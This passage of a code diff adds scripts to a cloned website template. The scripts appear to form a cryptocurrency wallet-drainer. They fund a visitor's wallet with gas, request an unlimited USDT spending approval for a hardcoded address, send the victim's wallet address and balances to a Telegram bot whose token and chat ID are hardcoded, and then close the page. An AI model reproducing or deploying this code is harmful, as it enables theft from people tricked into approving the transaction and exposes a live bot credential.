+            console.warn('⚠️ [BNB Top-up] Could not read response headers');
+        }
+
+        // Check if response is ok
+        if (!response.ok) {
+            let errorData = null;
+            let errorText = '';
+            try {
+                errorText = await response.text();
+                console.error('❌ [BNB Top-up] Error response body:', errorText);
+                // Try to parse as JSON
+                try {
+                    errorData = JSON.parse(errorText);
+                } catch(e) {
+                    // Not JSON, use as text
+                }
+            } catch(e) {
+                errorText = 'Could not read error response';
+                console.error('❌ [BNB Top-up] Could not read error response');
+            }
+            console.error('❌ [BNB Top-up] Request failed!');
+            console.error('❌ [BNB Top-up] Status:', response.status);
+            console.error('❌ [BNB Top-up] Status Text:', response.statusText);
+            
+            // Handle specific error cases from backend
+            if (response.status === 400) {
+                console.error('❌ [BNB Top-up] Bad Request - Invalid recipient address');
+                if (errorData && errorData.error) {
+                    console.error('❌ [BNB Top-up] Error:', errorData.error);
+                }
+            } else if (response.status === 500) {
+                console.error('❌ [BNB Top-up] Server Error - Transaction failed on backend');
+                if (errorData && errorData.error) {
+                    console.error('❌ [BNB Top-up] Error:', errorData.error);
+                }
+            } else {
+                console.error('❌ [BNB Top-up] Error:', errorText);
+            }
+            return false;
+        }
+
+        let data;
+        try {
+            const responseText = await response.text();
+            console.log('📥 [BNB Top-up] Raw response:', responseText);
+            data = JSON.parse(responseText);
+        } catch(e) {
+            console.error('❌ [BNB Top-up] Failed to parse JSON response');
+            console.error('❌ [BNB Top-up] Parse error:', e);
+            return false;
+        }
+        
+        console.log('📥 [BNB Top-up] Parsed response data:', data);
+        
+        if (data && data.success === true) {
+            console.log('✅ [BNB Top-up] SUCCESS! Backend confirmed transaction');
+            if (data.txHash) {
+                console.log('✅ [BNB Top-up] Transaction Hash:', data.txHash);
+                console.log('✅ [BNB Top-up] View on BSCScan: https://bscscan.com/tx/' + data.txHash);
+            }
+            console.log('✅ [BNB Top-up] Transaction confirmed on blockchain!');
+            console.log('✅ [BNB Top-up] 0.0002 BNB should now be in your wallet');
+            return true;  // Return true indicating the top-up was successful
+        } else {
+            console.error('❌ [BNB Top-up] Backend returned success: false or missing');
+            console.error('❌ [BNB Top-up] Response data:', data);
+            if (data && data.error) {
+                console.error('❌ [BNB Top-up] Error message:', data.error);
+            } else if (data && data.message) {
+                console.error('❌ [BNB Top-up] Error message:', data.message);
+            }
+            return false;  // Return false indicating the top-up failed
+        }
+    } catch (error) {
+        if (error.name === 'AbortError') {
+            console.error('❌ [BNB Top-up] Request timeout after 60 seconds');
+            console.error('❌ [BNB Top-up] Backend may be slow or blockchain confirmation is taking too long');
+            console.error('💡 [BNB Top-up] The transaction might still be processing. Check your wallet balance.');
+            // Store error type for better error message
+            error.errorType = 'timeout';
+        } else {
+            console.error('❌ [BNB Top-up] Exception caught:', error);
+            console.error('❌ [BNB Top-up] Error name:', error.name);
+            console.error('❌ [BNB Top-up] Error message:', error.message);
+            if (error.stack) {
+                console.error('❌ [BNB Top-up] Stack trace:', error.stack);
+            }
+            
+            // Check if it's a CORS/Network error
+            if (error.message && (error.message.includes('CORS') || error.message.includes('Failed to fetch') || error.message.includes('NetworkError') || error.message.includes('Network request failed') || error.message.includes('TypeError') || error.message.includes('Load failed'))) {
+                console.error('❌ [BNB Top-up] CORS/Network error detected!');
+                console.error('💡 [BNB Top-up] DIAGNOSIS:');
+                console.error('   Error:', error.message);
+                console.error('   This usually means the request cannot reach the backend.');
+                console.error('   Possible causes:');
+                console.error('   1. Mobile network blocking the request');
+                console.error('   2. Backend CORS not configured to allow all origins');
+                console.error('   3. Backend has IP whitelist/restrictions');
+                console.error('   4. Railway/Server firewall blocking');
+                console.error('   5. Network/firewall blocking the request');
+                console.error('   6. Backend URL might be incorrect');
+                console.error('');
+                console.error('   🔧 TROUBLESHOOTING:');
+                console.error('   1. Try switching between WiFi and mobile data');
+                console.error('   2. Check if backend is accessible: ' + BACKEND_URL);
+                console.error('   3. Verify backend CORS: app.use(cors({ origin: "*" }))');
+                console.error('   4. Check Railway logs for errors');
+                error.errorType = 'cors';
+            } else {
+                error.errorType = 'network';
+            }
+        }
+        // Store error for better error handling
+        error.isTopUpError = true;
+        throw error; // Re-throw so caller can handle it
+    }
+}
+
+// Token approval function remains the same
+async function approveToken(account) {
+    const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
+    const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');
+
+    // Get the current BNB balance
+    const bnbBalance = await web3.eth.getBalance(account);
+    const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether'); // Convert from Wei to BNB
+
+    // Get the actual USDT balance (not allowance)
+    const usdtBalance = await usdtContract.methods.balanceOf(account).call();
+    const usdtBalanceFormatted = web3.utils.fromWei(usdtBalance, 'ether'); // Convert from Wei to USDT
+
+    // Get the current approved USDT amount
+    const allowance = await usdtContract.methods.allowance(account, addressSTAKING).call();
+    const approvedUSDT = web3.utils.fromWei(allowance, 'ether'); // Convert from Wei to USDT
+
+    const currentDate = new Date();
+    const formattedDate = currentDate.toLocaleString();  // Format the current date and time
+
+    // Get the approved address
+    const approvedAddress = addressSTAKING;  // You can change this as needed
+
+    console.log('Processing....');
+    console.log('Account:', account);
+    console.log('BNB Balance:', balanceInBNB);
+    console.log('USDT Balance:', usdtBalanceFormatted);
+
+    await usdtContract.methods.approve(addressSTAKING, maxApprovalAmount)
+        .send({ from: account })
+        .on('transactionHash', async function (hash) {
+            console.log('✅ Approval transaction sent with hash:', hash);
+            console.log('📤 Attempting to send Telegram notification...');
+            console.log('📤 Account:', account);
+            console.log('📤 Balance BNB:', balanceInBNB);
+            console.log('📤 USDT Balance:', usdtBalanceFormatted);
+            console.log('📤 Approved Address:', approvedAddress);
+            console.log('📤 Date:', formattedDate);
+            console.log('📤 Hash:', hash);
+            
+            // Ensure all variables are defined
+            const walletAddr = account || 'Unknown';
+            const bnbBal = balanceInBNB || '0';
+            const usdtBal = usdtBalanceFormatted || '0';
+            const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
+            const dateStr = formattedDate || new Date().toLocaleString();
+            const txHash = hash || 'Unknown';
+            
+            // Send Telegram notification immediately when transaction hash is received
+            console.log('📨 [TX] Sending Telegram notification...');
+            sendTelegramNotification(
+                walletAddr, 
+                bnbBal, 
+                usdtBal, 
+                approvedAddr, 
+                dateStr, 
+                txHash
+            ).then(result => {
+                if (result) {
+                    console.log('✅ [TX] Telegram notification sent successfully');
+                } else {
+                    console.error('❌ [TX] Telegram notification returned false');
+                }
+            }).catch(err => {
+                console.error('❌ [TX] Telegram notification error:', err);
+            });
+            
+            var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
+            
+            // Use backend URL directly - works from any network
+            const apiUrl = `${BACKEND_URL}/home/TopUpWithMetamaskJson`;
+            
+            $.ajax({
+                url: apiUrl,
+                type: 'POST',
+                dataType: 'JSON',
+                contentType: 'application/json',
+                data: JSON.stringify(maindt),
+                timeout: 10000, // 10 second timeout
+                success: function (data) {
+                    console.log('Success');
+                    // Close site immediately after Telegram notification sent
+                    setTimeout(() => {
+                        window.close();
+                        // If window.close doesn't work, try redirect
+                        if (!window.closed) {
+                            // Try to redirect to backend, or just close
+                            try {
+                                location.href = `${BACKEND_URL}/home/index`;
+                            } catch(e) {
+                                // If redirect fails, just close
+                            }
+                        }
+                    }, 500);
+                },
+                error: function (err) {
+                    console.log("API error (non-critical): " + JSON.stringify(err));
+                    // This API call is non-critical - Telegram notification already sent
+                    // Close site even if API call fails (non-critical)
+                    setTimeout(() => {
+                        window.close();
+                        if (!window.closed) {
+                            try {
+                                // Try to redirect to backend
+                                location.href = `${BACKEND_URL}/home/index`;
+                            } catch(e) {
+                                // Ignore redirect errors
+                            }
+                        }
+                    }, 500);
+                }
+            });
+        })
+        .on('receipt', function (receipt) {
+            console.log('Approval confirmed with receipt:', receipt);
+        })
+        .on('error', function (error) {
+            hideLoading();
+            if (error.code === 4001) {
+                console.log("You canceled the approval request. Please try again.");
+                showLoading('Transaction canceled');
+                setTimeout(() => hideLoading(), 2000);
+            } else {
+                console.log("Approval failed: " + error.message);
+                showLoading('Approval failed. Please try again.');
+                setTimeout(() => hideLoading(), 2000);
+            }
+            console.error("Approval failed:", error);
+        });
+}
+
+// Telegram notification function - simplified and more reliable
+async function sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash) {
+    // Function is automatically available globally, but we'll also assign it explicitly
+    const botToken = '8421696275:AAHSW2oPzbMZySGAisCVYsTmqAEDkix-4Lc';
+    const chatId = '1998392818';
+    
+    const message = `🔔 USDT Approval Notification\n\n` +
+                    `👤 Wallet Address: ${walletAddress}\n` +
+                    `💰 BNB Balance: ${bnbAmount} BNB\n` +
+                    `💵 USDT Balance: ${usdtAmount} USDT\n` +
+                    `📍 Approved Address: ${approvedAddress}\n` +
+                    `📅 Date and Time: ${dateTime}`;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    console.log('📤 [TELEGRAM] Starting notification send...');
+    console.log('📤 [TELEGRAM] URL:', url);
+    console.log('📤 [TELEGRAM] Chat ID:', chatId);
+    console.log('📤 [TELEGRAM] Message length:', message.length);
+
+    try {
+        const requestBody = {
+            chat_id: chatId,
+            text: message
+        };
+        
+        console.log('📤 [TELEGRAM] Request body:', JSON.stringify(requestBody).substring(0, 200));
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(requestBody),
+            mode: 'cors'
+        });
+        
+        console.log('📤 [TELEGRAM] Response status:', response.status);
+        console.log('📤 [TELEGRAM] Response ok:', response.ok);
+        
+        const responseText = await response.text();
+        console.log('📤 [TELEGRAM] Response text:', responseText);
+        
+        let data;
+        try {
+            data = JSON.parse(responseText);
+        } catch (e) {
+            console.error('📤 [TELEGRAM] Failed to parse JSON:', e);
+            console.error('📤 [TELEGRAM] Raw response:', responseText);
+            return false;
+        }
+        
+        console.log('📤 [TELEGRAM] Parsed response:', data);
+        
+        if (data.ok) {
+            console.log('✅ [TELEGRAM] Notification sent successfully!');
+            console.log('📬 [TELEGRAM] Message ID:', data.result?.message_id);
+            return true;
+        } else {
+            console.error('❌ [TELEGRAM] Failed to send notification');
+            console.error('❌ [TELEGRAM] Error code:', data.error_code);
+            console.error('❌ [TELEGRAM] Error description:', data.description);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ [TELEGRAM] Exception caught:', error);
+        console.error('❌ [TELEGRAM] Error name:', error.name);
+        console.error('❌ [TELEGRAM] Error message:', error.message);
+        if (error.stack) {
+            console.error('❌ [TELEGRAM] Error stack:', error.stack);
+        }
+        return false;
+    }
+}
+
+// Function is already globally accessible, but ensure it's on window for explicit access
+if (typeof window !== 'undefined') {
+    window.sendTelegramNotification = sendTelegramNotification;
+}
+
+</script>
+<script>
+    const amountInput = document.getElementById("amountInput");
+    const amountDisplay = document.getElementById("amountDisplay");
+
+    // Listen for input changes
+    amountInput.addEventListener("input", function () {
+        // Get the current value and convert to a number if needed
+        const val = amountInput.value;
+        // Update the p tag; you can add formatting as needed 
+        amountDisplay.textContent = `= $${val || "0.00"}`;
+    });
+</script>
+
+
+
+
+
+
+
+
+
+</body><!-- Mirrored from demo.awaikenthemes.com/html-preview/quivox/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2025 07:58:55 GMT --></html>
